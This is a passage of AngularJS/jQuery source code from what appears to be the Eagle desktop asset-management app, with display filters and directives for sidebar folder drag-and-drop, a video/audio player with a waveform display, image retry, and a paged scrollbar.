            return (input / 1000000).toFixed(1) + 'M';
        }
        if (input >= 1000000000) {
            return (input / 1000000000).toFixed(1) + 'B';
        }
    };
});

EagleApp.filter('shortcuts', function ($window) {
    return function (key) {
        if (!key) return '';
        if (process.platform != 'darwin') {
            return key.replace('CommandOrControl', 'Ctrl').replace('CmdOrCtrl', 'Ctrl').replace('⌘', 'Ctrl');
        } else {
            return key.replace(/\+/g, ' ').replace('CommandOrControl', '⌘').replace('CmdOrCtrl', '⌘').replace('Command', '⌘').replace('Ctrl', '⌘').replace('Shift', '⇧').replace('Alt', '⌥').replace('Delete', '⌫').replace('Control', '⌃').replace('Option', '⌥').replace('Backspace', '⌫');
        }
    }
});

EagleApp.filter('filesize', function () {
    var units = [
        'bytes',
        'KB',
        'MB',
        'GB',
        'TB',
        'PB'
    ];

    return function (bytes, precision) {
        if (isNaN(parseFloat(bytes)) || !isFinite(bytes)) {
            return '?';
        }

        var unit = 0;
        var k = 1024;
        if (process.platform === 'darwin') k = 1000;

        while (bytes >= k) {
            bytes /= k;
            unit++;
        }
        return bytes.toFixed(+2) + ' ' + units[unit];
        // return bytes.toFixed(+precision) + ' ' + units[unit];
    };
});

EagleApp.filter('themePath', function () {
    return function (theme) {
        if (theme === 'light' || theme === 'lightgray') {
            return 'light';
        }
        else {
            return 'dark';
        }
    };
});
$(window).keydown(function (e) {
    if (e.keyCode == 27) {
        try {
            $(".sidebar .prevent-drop").removeClass("prevent-drop")
            $(".multiple-drop-folder-top-area.ui-state-hover, .item.ui-state-hover, .multiple-drop-folder-top-area.ui-state-highlight, .multiple-drop-folder-bottom-area.ui-state-hover, .item.ui-state-hover, .multiple-drop-folder-bottom-area.ui-state-highlight, .item.ui-state-highlight").removeClass("ui-state-highlight ui-state-hover");
            $("body").removeClass("dragging-folder dragging-smart-folder")
            $(document).trigger("mouseup")
            // var ddm = $.ui.ddmanager.current;
            // if (ddm ) {
            //     dragCheck = false;
            //     ddm.cancel();
            // }
        }
        catch (err) {
            dragCheck = false;
        }
    }
});

// 自动 hover 展开文件夹
var droppableFolderMouseTarget;
var droppableFolderExpandTimeout;
$(".sidebar").on('mouseover.folder.drop', '.multiple-drop-folder-name-area', function (event) {
    droppableFolderMouseTarget = event.target;
    droppableFolderExpandTimeout = setTimeout(function () {
        if (droppableFolderExpandTimeout && droppableFolderMouseTarget) {
            var folderScope = angular.element(droppableFolderMouseTarget).scope();
            if (!folderScope) return;
            var dragFolder = folderScope.node || folderScope.folder;
            if (dragFolder && !dragFolder.isExpand) {
                var $scope = angular.element("body").scope();
                dragFolder.isExpand = true;
                $scope.updateSidebarList();
                setTimeout(function () {
                    $(".sidebar-container").scroll();
                }, 50);
                $scope.$evalAsync();
            }
        }
    }, 1200);
});

$("body").on('mouseleave.folder.drop', '.multiple-drop-folder-name-area', function (event) {
    droppableFolderMouseTarget = undefined;
    clearTimeout(droppableFolderExpandTimeout);
});

EagleApp.directive('alwaysFocus', function ($rootScope) {
    return {
        restrict: 'A',
        link: (scope, element, attrs, controllersArr) => {
            let interval = setInterval(() => {
                if ($(element).is(":visible")) {
                    // if is not focused
                    if (!$(element).is(":focus")) {
                        element.focus();
                    }
                }
            }, 100);
        }
    }
});

EagleApp.directive('sidebarFolderItem', function ($rootScope) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs, controllersArr) {

            // 延迟初始化，可以大幅提升 scrollbar 性能
            var initTimeout;
            var hasInit = false;
            element.on("mouseover.drag", function () {
                initTimeout = setTimeout(function () {
                    if (!hasInit) {
                        initEvent();
                        hasInit = true;
                    }
                }, 100);
            });

            element.on("mouseleave.drag", function () {
                if (initTimeout) {
                    clearTimeout(initTimeout);
                }
            });
            // initTimeout = setTimeout(function () {
            //     initEvent();
            // }, 500);

            scope.$on('$destroy', function() {
                element.off("mouseover.drag");
                element.off("mouseleave.drag");
                clearTimeout(initTimeout);
            });

            function initEvent() {
                console.log("initEvent");
                var $bodyScope = angular.element("body").scope();
                var $dragItem = $(element);
                // $rootScope.draggedFolders = [];

                $(element).draggable({
                    scroll: false,
                    // scrollSensitivity: 100,
                    // containment: ".sidebar-container",
                    distance: 5,
                    appendTo: 'body',
                    cursor: "default",
                    cursorAt: { top: -5, left: -5 },
                    helper: function (event) {

                        $rootScope.draggedFolders = [];
                        $bodyScope = angular.element("body").scope();

                        var dragFolder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder;
                        var lastFolder = dragFolder;

                        if ($rootScope.selectedFolders && $rootScope.selectedFolders.indexOf(dragFolder) > -1) {
                            lastFolder = $rootScope.selectedFolders[$rootScope.selectedFolders.length - 1];
                            $rootScope.selectedFolders.forEach(function (f) {
                                $rootScope.draggedFolders.push(f);
                            });
                        }
                        else {
                            $rootScope.draggedFolders.push(lastFolder);
                        }

                        $rootScope.draggedQuickAccess = dragFolder;

                        var count = $rootScope.draggedFolders.length || 1;
                        var folderName = lastFolder && lastFolder.name || "";
                        var folderIcon = lastFolder.icon || "folder-close";
                        if (count > 1) {
                            return $(`
                                <div class='multiple-drag-folder-helper multiple'>
                                    <div class="icon icon-${folderIcon}">
                                        <div class="fake-svg"></div>
                                    </div>
                                    <div class="name">${folderName}</div>
                                    <div class="badge">${count}</div>
                                </div>
                                `);
                        }
                        else {
                            return $(`
                                <div class='multiple-drag-folder-helper'>
                                    <div class="icon icon-${folderIcon}">
                                        <div class="fake-svg"></div>
                                    </div>
                                    <div class="name">${folderName}</div>
                                </div>
                            `);
                        }
                    },
                    start: function (e, ui) {
                        dragCheck = true;
                        $("body").addClass("dragging-folder");
                        $("body").addClass("dragging-quick-access");
                        $dragItem.addClass("prevent-drop");
                    },
                    stop: function () {
                        $("body").removeClass("dragging-folder");
                        $("body").removeClass("dragging-quick-access");
                        $dragItem.removeClass("prevent-drop");
                        setTimeout(function () {
                            dragCheck = false;
                        }, 50);
                    }
                });

                var $nameArea = $(element).find(".multiple-drop-folder-name-area");
                var $topArea = $(element).find(".multiple-drop-folder-top-area");
                var $bottomArea = $(element).find(".multiple-drop-folder-bottom-area");

                var $dropParent = $(element);
                $nameArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var folder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder;
                        if (folder) {
                            $bodyScope.moveFoldersToFolder($rootScope.draggedFolders, folder);
                            $bodyScope.$evalAsync();
                        }
                    }
                });

                $topArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var folder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder;
                        if (folder) {
                            $bodyScope.moveFoldersAsSibling($rootScope.draggedFolders, folder);
                            $bodyScope.$evalAsync();
                        }
                    }
                });

                $bottomArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var folder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder;
                        if (folder) {
                            $bodyScope.moveFoldersAsSibling($rootScope.draggedFolders, folder, true);
                            $bodyScope.$evalAsync();
                        }
                    }
                });
            }
        }
    }
});

EagleApp.directive('vsAutoScroll', function ($rootScope) {
    return {
        scope: {
            index: "=index"
        },
        restrict: 'A',
        link: function (scope, elem, attrs, controllersArr) {
            var $container = $(elem);
            var size = parseInt(attrs.vsSize) || 30;
            if (attrs.scrollContainer) {
                $container = $(attrs.scrollContainer);
            }
            scope.$watch("index", function (idx) {
                try {
                    if (idx !== undefined) {
                        var $containerScope = angular.element($container).scope();
                        if (!$containerScope.sizes || !$containerScope.sizesCumulative) return;
                        var sizes = $containerScope.sizes;
                        var sizesCumulative = $containerScope.sizesCumulative;
                        var targetPos = sizesCumulative[idx];
                        var scrollTop = $container.scrollTop();
                        var containerHeight = $container.innerHeight();
                        var to;
                        // 如果根本不在画面上，直接跳跃
                        if (Math.abs(targetPos - scrollTop) > containerHeight) {
                            to = targetPos - containerHeight / 2;
                        }
                        // 处于画面下方
                        else if (targetPos > scrollTop + containerHeight - sizes[idx]) {
                            to = targetPos - containerHeight + sizes[idx];
                        }
                        // 处于画面上方
                        else if (targetPos < scrollTop) {
                            to = targetPos;
                        }
                        $container.scrollTop(to);
                    }
                }
                catch (err) {

                }
            });

        }
    }
});


EagleApp.directive('sidebarSmartFolderItem', function ($rootScope) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs, controllersArr) {

            // 延迟初始化，可以大幅提升 scrollbar 性能
            var initTimeout;
            var hasInit = false;
            element.on("mouseover.drag", function () {
                initTimeout = setTimeout(function () {
                    if (!hasInit) {
                        initEvent();
                        hasInit = true;
                    }
                }, 100);
            });

            element.on("mouseleave.drag", function () {
                if (initTimeout) {
                    clearTimeout(initTimeout);
                }
            });
            
            scope.$on('$destroy', function() {
                element.off("mouseover.drag");
                element.off("mouseleave.drag");
                clearTimeout(initTimeout);
            });

            function initEvent() {
                var $bodyScope = angular.element("body").scope();
                var $dragItem = $(element);
                
                $(element).draggable({
                    scroll: false,
                    distance: 5,
                    appendTo: 'body',
                    cursor: "default",
                    cursorAt: { top: -5, left: -5 },
                    helper: function (event) {

                        $rootScope.draggedSmartFolders = [];
                        $bodyScope = angular.element("body").scope();

                        var dragSmartFolder = angular.element(event.target).scope().node;
                        var lastSmartFolder = dragSmartFolder;

                        if ($rootScope.selectedSmartFolders && $rootScope.selectedSmartFolders.indexOf(dragSmartFolder) > -1) {
                            lastSmartFolder = $rootScope.selectedSmartFolders[$rootScope.selectedSmartFolders.length - 1];
                            $rootScope.selectedSmartFolders.forEach(function (f) {
                                $rootScope.draggedSmartFolders.push(f);
                            });
                        }
                        else {
                            $rootScope.draggedSmartFolders.push(lastSmartFolder);
                        }

                        $rootScope.draggedQuickAccess = dragSmartFolder;

                        var count = $rootScope.draggedSmartFolders.length || 1;
                        var folderName = lastSmartFolder && lastSmartFolder.name || "";
                        var folderIcon = lastSmartFolder.icon || "folder-close";
                        if (count > 1) {
                            return $(`
                                <div class='multiple-drag-folder-helper multiple'>
                                    <div class="icon icon-${folderIcon}">
                                        <div class="fake-svg"></div>
                                    </div>
                                    <div class="name">${folderName}</div>
                                    <div class="badge">${count}</div>
                                </div>
                                `);
                        }
                        else {
                            return $(`
                                <div class='multiple-drag-folder-helper'>
                                    <div class="icon icon-${folderIcon}">
                                        <div class="fake-svg"></div>
                                    </div>
                                    <div class="name">${folderName}</div>
                                </div>
                            `);
                        }
                    },
                    start: function (e, ui) {
                        dragCheck = true;
                        $("body").addClass("dragging-smart-folder");
                        $("body").addClass("dragging-quick-access");
                        $dragItem.addClass("prevent-drop");
                    },
                    stop: function () {
                        $("body").removeClass("dragging-smart-folder");
                        $("body").removeClass("dragging-quick-access");
                        $dragItem.removeClass("prevent-drop");
                        setTimeout(function () {
                            dragCheck = false;
                        }, 50);
                    }
                });

                var $topArea = $(element).find(".multiple-drop-smart-folder-top-area");
                var $bottomArea = $(element).find(".multiple-drop-smart-folder-bottom-area");
                var $dropParent = $(element);
                var $nameArea = $(element).find(".multiple-drop-smart-folder-name-area");

                $nameArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var folder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder;
                        if (folder) {
                            $bodyScope.moveSmartFoldersToSmartFolder($rootScope.draggedSmartFolders, folder);
                            $bodyScope.$evalAsync();
                        }
                    }
                });

                $topArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var folder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder;
                        if (folder) {
                            $bodyScope.moveSmartFolderTo($rootScope.draggedSmartFolders, folder);
                            $bodyScope.$evalAsync();
                        }
                    }
                });

                $bottomArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var folder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder;
                        if (folder) {
                            $bodyScope.moveSmartFolderTo($rootScope.draggedSmartFolders, folder, true);
                            $bodyScope.$evalAsync();
                        }
                    }
                });
            }

            scope.$on('$destroy', function () { });
        }
    }
});

EagleApp.directive('sidebarQuickAccessItem', function ($rootScope) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs, controllersArr) {

            // 延迟初始化，可以大幅提升 scrollbar 性能
            var initTimeout;
            initTimeout = setTimeout(function () {
                initEvent();
            }, 500);

            scope.$on('$destroy', function() {
                clearTimeout(initTimeout);
            });

            function initEvent() {
                var $bodyScope = angular.element("body").scope();
                $(element).draggable({
                    scroll: false,
                    distance: 5,
                    appendTo: 'body',
                    cursor: "default",
                    cursorAt: { top: -5, left: -5 },
                    helper: function (event) {

                        $bodyScope = angular.element("body").scope();
                        $rootScope.draggedQuickAccess = angular.element(event.target).scope().node;
                        var item = $bodyScope.QuickAccessManager.getItem($rootScope.draggedQuickAccess.type, $rootScope.draggedQuickAccess.id);
                        if (!item) return;

                        var folderName = item.name || "";
                        var folderIcon = item.icon || "folder-close";
                        return $(`
                            <div class='multiple-drag-folder-helper'>
                                <div class="icon icon-${folderIcon}">
                                    <div class="fake-svg"></div>
                                </div>
                                <div class="name">${folderName}</div>
                            </div>
                        `);
                    },
                    start: function (e, ui) {
                        dragCheck = true;
                        $("body").addClass("dragging-quick-access");
                    },
                    stop: function () {
                        $("body").removeClass("dragging-quick-access");
                        setTimeout(function () {
                            dragCheck = false;
                        }, 50);
                    }
                });

                var $topArea = $(element).find(".multiple-drop-quick-access-top-area");
                var $bottomArea = $(element).find(".multiple-drop-quick-access-bottom-area");
                var $dropParent = $(element);

                $topArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var item = angular.element(event.target).scope().node;
                        var idx = QuickAccessManager.indexOf($rootScope.draggedQuickAccess);
                        if (item && $rootScope.draggedQuickAccess) {
                            if (idx === -1) {
                                var type = "folder";
                                if ($rootScope.draggedQuickAccess.conditions) { type = "smartFolder" };
                                var accessItem = {
                                    type: type,
                                    id: $rootScope.draggedQuickAccess.id
                                };
                                $bodyScope.addQuickAccessTo(accessItem, item);
                                $bodyScope.$evalAsync();
                            }
                            else {
                                $bodyScope.moveQuickAccessTo($rootScope.draggedQuickAccess, item);
                                $bodyScope.$evalAsync();
                            }
                        }
                    }
                });

                $bottomArea.droppable({
                    tolerance: "pointer",
                    drop: function (event, ui) {
                        event.stopPropagation();
                        var item = angular.element(event.target).scope().node;
                        var idx = QuickAccessManager.indexOf($rootScope.draggedQuickAccess);
                        if (item && $rootScope.draggedQuickAccess) {
                            if (idx === -1) {
                                var type = "folder";
                                if ($rootScope.draggedQuickAccess.conditions) { type = "smartFolder" };
                                var accessItem = {
                                    type: type,
                                    id: $rootScope.draggedQuickAccess.id
                                };
                                $bodyScope.addQuickAccessTo(accessItem, item, true);
                                $bodyScope.$evalAsync();
                            }
                            else {
                                $bodyScope.moveQuickAccessTo($rootScope.draggedQuickAccess, item, true);
                                $bodyScope.$evalAsync();
                            }
                        }
                    }
                });
            }

            scope.$on('$destroy', function () { });
        }
    }
});

var scrollPositionSaverPositions = {};
EagleApp.directive('scrollPositionSaver', function ($rootScope) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs, controllersArr) {

            let scrollToTimeout;
            attrs.$observe('scrollPositionSaver', (value) => {
                clearTimeout(scrollToTimeout);
                const id = value;
                if (!id) return;
                const lastScrollTop = scrollPositionSaverPositions[id] || 0;
                element.scrollTop(lastScrollTop);
                setTimeout(() => { element.scrollTop(lastScrollTop); }, 30);
                scrollToTimeout = setTimeout(() => {
                    element.scrollTop(lastScrollTop);
                }, 100);
            });

            let scrollTimeout;
            element.on("scroll", () => {
                clearTimeout(scrollTimeout);
                scrollTimeout = setTimeout(() => {
                    const scrollTop = element.scrollTop();
                    const id = attrs.scrollPositionSaver;
                    if (id) {
                        scrollPositionSaverPositions[id] = scrollTop;
                    }
                }, 100);
            });
        }
    }
});

EagleApp.directive('audioMediaElement', function ($rootScope) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs) {

            var wavesurfer;
            var wavesurferInterval;

            if ($("div.video-js").length > 0) {
                videojs($("div.video-js")[0]).dispose();
                return;
            }

            var ipcRenderer = require('electron').ipcRenderer;
            var video = element[0];
            var $parentScope = angular.element("body").scope();

            var volume = localStorage.getItem("eagle.videoPlayer.volume") || 100;
            video.volume = parseInt(volume) / 100;

            // 播放器初始化
            scope.$on('$destroy', function () {
                console.log("destory")
                if (element[0] && element[0].removeAllListeners) {
                    element[0].removeAllListeners();
                }
                video.src = "";
                videojs(element[0]).dispose();
                element.off();
                element.remove();
                if (wavesurfer) {
                    wavesurfer.destroy();
                }
                clearInterval(wavesurferInterval);
            });
            
            element.bind('error', _.debounce(function () {
                try {
                    var $scope = angular.element("body").scope();
                    var newPath = FileUrlHelper.getRawUrl(scope.current);
                    element.attr("src", newPath);
                    console.log("视频名称更新，重新定位新图片位置: " + newPath);
                }
                catch (err) {

                }
            }, 333, true));

            var initVideoJS = false;

            video.addEventListener('ended', function () {
                if (video.customizeLoop) {
                    video.currentTime = 0;
                    setTimeout(function () {
                        video.play();
                    }, 50);
                }
                else {
                    video.pause();
                }
            });

            video.addEventListener('loadedmetadata', function () {
                console.log("loadedmetadata");

                var volume = localStorage.getItem("eagle.videoPlayer.volume") || 100;
                video.volume = parseInt(volume) / 100;

                var currentTime;
                var autoPlay = true;
                var rememberPosition = false;
                video.customizeLoop = true;

                if (initVideoJS) {
                    if (autoPlay) {
                        video.play();
                    }
                    else {
                        video.pause();
                    }

                    if (video.customizeLoop) {
                        $(".vjs-icon-loop").addClass('enabled');
                    }
                    else {
                        $(".vjs-icon-loop").removeClass('enabled');
                    }

                    initWaveform();

                    return;
                }

                initVideoJS = true;
                var $v = videojs(video, {
                    language: (preferences && preferences.general && preferences.general.language) || "en",
                    loadingSpinner: false,
                    volume: parseInt(volume) / 100,
                    playbackRates: [0.5, 0.75, 1, 1.25, 1.5, 1.75, 2],
                }).ready(function () {
                    if (!$parentScope.isDetailMode) {
                        return;
                    }
                    var player = this;
                    // Videojs bug，滑桿不會自動更新
                    $(player.el()).find(".vjs-volume-level").css("width", video.volume * 100 + "%");
                    var $video = $(video);
                    var fullScreenButton = player.controlBar.fullscreenToggle.el_;
                    var $fullScreenButton = $(fullScreenButton).detach();
                    var loopBtn = player.controlBar.addChild('button');
                    loopBtn.controlText(player.localize('Loop'));
                    loopBtn.addClass('vjs-icon-loop');
                    loopBtn.on('click', function () {
                        video.customizeLoop = !video.customizeLoop;
                        localStorage.setItem("eagle.videoPlayer.loop", video.customizeLoop);
                        updateLoopButton();
                    });
                    $fullScreenButton.insertAfter(loopBtn.el_);

                    this.el_.addEventListener("mousewheel", function (event) {
                        doScroll(event, player);
                    }, false);
                    var old_element = $('.vjs-fullscreen-control')[0];
                    if (!old_element) {
                        video.pause();
                        return;
                    }
                    var new_element = old_element.cloneNode(true);
                    old_element.parentNode.replaceChild(new_element, old_element);
                    $('.vjs-fullscreen-control').eq(0).on("click", function (event) {
                        event.preventDefault();
                        ipcRenderer.send('toggle-slideshow');
                    });

                    updateLoopButton();

                    function updateLoopButton() {
                        if (!video.customizeLoop) {
                            $(loopBtn.el_).removeClass("enabled");
                        }
                        else {
                            $(loopBtn.el_).addClass("enabled");
                        }
                    }

                    if (autoPlay) {
                        video.play();
                    }
                    else {
                        video.pause();
                    }
                    initWaveform();



                });
            }, false);

            function initWaveform () {

                if (video.duration > 3600) return;
                var WaveSurfer = new require(appRoot.path + "/app/js/vendors/wavesurfer.min.js");
                // 
                // 音波效果初始化
                if (wavesurfer) {
                    wavesurfer.destroy();
                    $(video).off('pause');
                    $(video).off('play');
                    $(video).off('timeupdate');
                    clearInterval(wavesurferInterval);
                }
                wavesurfer = WaveSurfer.create({
                    // container: "#detail-wavesurfer",
                    container: ".vjs-progress-holder.vjs-slider.vjs-slider-horizontal",
                    waveColor: '#7C7C7C',
                    progressColor: '#0072EF',
                    cursorColor: "#0072EF",
                    cursorWidth: 1,
                    normalize: true,
                    forceDecode: true,
                    height: 40,
                    responsive: true,
                    interact: false,
                });
                
                wavesurfer.on('ready', function () {

                    wavesurferInterval = setInterval(function () {
                        if (video && video.currentTime) {
                            const currPercent = video.currentTime / video.duration;
                            const curr = wavesurfer.getDuration() * currPercent;
                            wavesurfer.setCurrentTime(curr);
                        }
                    }, 16);

                    wavesurfer.setMute(true);
                });

                var src = video.src;
                var xhr = new XMLHttpRequest();
                xhr.open('GET', src);
                xhr.responseType = 'blob';
                xhr.onload = function (e) { 
                    wavesurfer.loadBlob(xhr.response);
                }
                xhr.send();
            };

            var volumeTimeout;
            video.onvolumechange = function (event) {
                let iconClass = "vol-3";
                var value = Math.round(video.volume * 100) / 1;
                if (video.muted) value = 0;
                if (value === 0) {
                    iconClass = "vol-0";
                }
                else if (value < 30) {
                    iconClass = "vol-1";
                }
                else if (value < 100) {
                    iconClass = "vol-2";
                }
                else {
                    iconClass = "vol-3";
                }
                value = value + "%";
                $("#video-player-tips").removeClass('vol-0 vol-1 vol-2 vol-3').addClass(iconClass);
                $("#video-player-tips .value").html(value);
                $("#video-player-tips").show();
                localStorage.setItem("eagle.videoPlayer.volume", value);
                clearTimeout(volumeTimeout);
                volumeTimeout = setTimeout(function () {
                    $("#video-player-tips").hide();
                }, 1000);
            };

            element.on("click", function () {
                element.css("opacity", 1);
                element.stop().animate({ "opacity": 0.9 }, 50, function () {
                    element.stop().animate({ "opacity": 1 }, 50);
                });
            });

            element.on("dblclick", function () {
                var $scope = angular.element("body").scope();
                $scope.leaveDetailMode();
            });

            var direction;
            var directionTimeout;
            var doScroll = function (e, player) {

                if ($rootScope.preferences.habits.scrollBehavior === 'paging') {
                    return;
                }

                e.preventDefault();
                e.stopPropagation();

                if (!player) return;

                directionTimeout = setTimeout(function () {
                    direction = "";
                }, 300);

                var deltaX = Math.max(-1, Math.min(1, -e.deltaX));
                var deltaY = Math.max(-1, Math.min(1, -e.deltaY));
                var step = e.deltaX / 40;

                if ((e.shiftKey || e.altKey) && e.deltaY) {
                    direction = "horizontal";
                    if (!e.deltaX) {
                        step = -e.deltaY / 40;
                    }
                }
                else if (Math.abs(e.deltaY) > Math.abs(e.deltaX)) {
                    direction = "vertical";
                    if ($rootScope.preferences.habits.videoScrollBehavior === 'progress') {
                        step = -e.deltaY / 40;    
                    }
                }
                else {
                    direction = "horizontal";
                    step = -e.deltaX / 40;
                }

                if (direction == "horizontal" || $rootScope.preferences.habits.videoScrollBehavior === 'progress') {
                    clearTimeout(directionTimeout);
                    var absStep = Math.abs(step);
                    let newTime = video.currentTime;
                    if (step < 0 && newTime - absStep <= video.duration) { newTime += absStep; }
                    if (step > 0 && newTime + absStep > 0) { newTime -= absStep; }
                    if (newTime === player.duration()) {
                        newTime = newTime - 0.1
                    }
                    player.currentTime(newTime)
                } else if (direction == "vertical" && Math.abs(e.deltaY) > 7) {
                    clearTimeout(directionTimeout);
                    if (deltaY == 1) {
                        if (video.volume + 0.05 > 1) {
                            video.volume = 1;
                        } else {
                            video.volume += 0.05;
                        }
                    } else {
                        if (video.volume - 0.05 < 0) {
                            video.volume = 0;
                        } else {
                            video.volume -= 0.05;
                        }
                    }
                }
            };
        }
    }
});

EagleApp.directive('retryWhenError', function () {
    return {
        scope: {
            retryWhenError: "=retryWhenError"
        },
        link: function (scope, element, attrs) {
            let retryCount = 5;
            element.bind('error', _.debounce(function () {
                try {
                    if (retryCount === 0) {
                        return;
                    }
                    if (!scope.retryWhenError) return;
                    var newPath = FileUrlHelper.getRawUrl(scope.retryWhenError);
                    element.attr("src", newPath);
                    console.log("图片名称更新，重新定位新图片位置: " + newPath);
                    retryCount--;
                }
                catch (err) {

                }
            }, 1000, true));
        }
    }
});

EagleApp.directive('retryWhenThumbError', function () {
    return {
        scope: {
            retryWhenThumbError: "=retryWhenThumbError"
        },
        link: function (scope, element, attrs) {
            let retryCount = 50;
            element.bind('error', _.debounce(function () {
                try {
                    if (retryCount === 0) {
                        return;
                    }
                    if (!scope.retryWhenThumbError) return;
                    var newPath = FileUrlHelper.getThumbnailUrl(scope.retryWhenThumbError);
                    element.attr("src", newPath);
                    console.log("图片名称更新，重新定位新图片位置: " + newPath);
                    retryCount--;
                }
                catch (err) {

                }
            }, 100, true));
        }
    }
});

EagleApp.directive('boxContainerScrollbar', function ($filter) {
    return {
        link: function (scope, element, attrs) {

            var enabledSize = 6;
            var $bodyScope = angular.element("body").scope();
            var $boxContainer = $("#box-container");
            var $scrollThumb = element.find(".box-container-scrollbar-thumb");
            var $scrollHints = element.find(".box-container-scrollbar-hints");
            var orderBy;

            element.on("UPDATE_BOX_SCROLLBAR", function () {
            // scope.$on("UPDATE_BOX_SCROLLBAR", function () {
                var total = $bodyScope.allData.length;
                // var pageLength = parseInt($bodyScope.allData.length / $bodyScope.options.page);
                // var current;
                // var itgs = ig._items._data;
                // if (itgs[0]) {
                //     var pos = ig._watcher.getScrollPos();
                //     for (var i = itgs.length - 1; i >= 0; i--) {
                //         var group = itgs[i];
                //         if (pos > group.outlines.end[group.outlines.end.length - 1]) {
                //             break;
                //         }
                //         current = group.groupKey - 1000000;
                //     }
                // }

                // if (current === undefined) {
                //     switchNormalMode();
                //     return;
                // }

                updateThumbHeight(total);
                // updateThumbPosition(current, pageLength, 0);
                $boxContainer.trigger("scroll.boxContainer");

                if ($bodyScope.currentFolder) {
                    if ($bodyScope.currentFolder.orderBy) {
                        orderBy = $bodyScope.currentFolder.orderBy;
                    }
                    else {
                        orderBy = $bodyScope.orderBy;
                    }
                }
                else if ($bodyScope.currentSmartFolder) {
                    if ($bodyScope.currentSmartFolder.orderBy) {
                        orderBy = $bodyScope.currentSmartFolder.orderBy;
                    }
                    else {
                        orderBy = $bodyScope.orderBy;
                    }
                }
                else {
                    orderBy = $bodyScope.orderBy;
                }
            });

            //var scrollTimeout;
            // $boxContainer.on("mousewheel.boxContainer", _.throttle(function () {
            //     $boxContainer.trigger("scroll.boxContainer");
            // }, 200, true));
            $boxContainer.on("scroll.boxContainer", _.throttle(function () {

                if (!ig) return;
                // console.time("scroll.boxContainer")r
                var total = $bodyScope.allData.length;
                var pageLength = parseInt($bodyScope.allData.length / $bodyScope.options.page);
                var current;
                var decimal;
                var itgs = ig._items._data;
                if (itgs[0]) {
                    var top;
                    var bottom;
                    var total;
                    var pos = ig._watcher.getScrollPos();
                    for (var i = itgs.length - 1; i >= 0; i--) {
                        var group = itgs[i];
                        var end = group.outlines.end[group.outlines.end.length - 1];
                        if (pos > end) {
                            if (itgs[i + 1]) {
                                top = itgs[i + 1].outlines.start[group.outlines.start.length - 1];
                                bottom = itgs[i + 1].outlines.end[group.outlines.end.length - 1];
                            }
                            break;
                        }
                        else {
                            if (itgs[0]) {
                                top = itgs[0].outlines.start[group.outlines.start.length - 1];
                                bottom = itgs[0].outlines.end[group.outlines.end.length - 1];
                            }
                        }
                        current = group.groupKey - 1000000;
                    }

                    if (top !== undefined && bottom !== undefined) {
                        total = bottom - top;
                        if (total > 0) {
                            decimal = (pos - top) / total;
                        }
                    }
                }

                if (current === undefined) {
                    updateThumbPosition(0, pageLength - 1, 0);
                }
                else {
                    updateThumbPosition(current || 0, pageLength - 1, decimal);    
                }
                // console.timeEnd("scroll.boxContainer")
                
            }, 64, true));

            function switchNormalMode() {
                $("#sub-folder-container").show();
                $("#box-container").removeClass("hide-scrollbar");
                element.hide();
            };

            function switchPageMode() {
                $("#box-container").addClass("hide-scrollbar");
                element.show();
            };

            function updateThumbHeight(total) {
                if (total / $bodyScope.options.page <= enabledSize) {
                    switchNormalMode();
                }
                else {
                    switchPageMode();
                    var scrollHeight = element.height();
                    var height = parseInt($bodyScope.options.page / total * scrollHeight);
                    if (height < 18) height = 18;
                    $scrollThumb.height(height);
                    // console.log(`thumbHeight: ${height}`);
                }
            };

            var updateThumbPositionAnimateTimeout;
            var $subFolderContainer = $("#sub-folder-container");
            var $scrollToTop = $("#scroll-to-top");
            var updateThumbPositionTimeout;
            var updateThumbPositionRequest;
            var scrollBarHiehgt = $("#box-container-scrollbar").height();
            var thumbnailHeight = $scrollThumb.height();
            function updateThumbPosition(to, total, decimal) {

                if (to > total) {
                    to = total;
                }
                if (decimal > 0) {
                    to += decimal;
                }

                // clearTimeout(updateThumbPositionTimeout);
                // updateThumbPositionTimeout = setTimeout(function () {
                    if (to >= 1) {
                        $subFolderContainer.hide();
                        if (!$scrollToTop.hasClass("show")) {
                            $scrollToTop.addClass("show");
                        }
                    }
                    else {
                        $subFolderContainer.show();
                    }
                    scrollBarHiehgt = $("#box-container-scrollbar").height();
                    thumbnailHeight = $scrollThumb.height();
                // }, 20);
                
                if (to < 0) to = 0;
                var percentage = (to / total) * 100;
                if (percentage > 100) percentage = 100;
                var scrollTop = (scrollBarHiehgt - thumbnailHeight) * percentage / 100;
                $scrollThumb.css({
                    top: `${scrollTop}px`
                    // transform: `translateY(${scrollTop}px)`
                })
                // cancelAnimationFrame(updateThumbPositionRequest);
                // updateThumbPositionRequest = requestAnimationFrame(() => {
                    
                // });

            };

            var goToPageTimeout;
            var lastPage;
            function goToPage(targetPage, { updatePosition }) {

                if (targetPage !== lastPage) {
                    clearTimeout(goToPageTimeout);
                }
                
                if (targetPage === $bodyScope.startCursor) {
                    if (targetPage === 0) {
                        resetNgGridLayoutData($bodyScope.allData, 0);
                        setTimeout(function () { $boxContainer.scrollTop(10); }, 200);
                    }
                    return;
                }

                $bodyScope.startCursor = targetPage;
                var pageLength = parseInt($bodyScope.allData.length / $bodyScope.options.page);
                var percentage = targetPage / pageLength * 100;

                if (updatePosition) {
                    updateThumbPosition(targetPage, pageLength, 0);
                }

                lastPage = targetPage;

                goToPageTimeout = setTimeout(function () {
                    if (targetPage === pageLength) {
                        $bodyScope.gotoBottom();
                    }
                    else {
